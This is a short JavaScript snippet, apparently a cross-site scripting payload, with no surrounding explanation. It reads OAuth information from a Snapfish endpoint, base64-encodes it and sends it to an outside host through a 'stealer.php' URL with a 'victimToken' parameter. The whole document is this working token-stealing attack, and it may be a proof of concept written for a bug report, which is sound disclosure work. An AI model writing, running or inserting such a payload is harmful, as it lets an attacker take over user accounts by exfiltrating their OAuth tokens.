fetch("https://www.snapfish.com/library/getOauthInfo")
  .then(r => r.text())
  .then(d => fetch("https://marciosz.myartsonline.com/snapfish/fbxss/stealer.php?victimToken=" + btoa(d)));
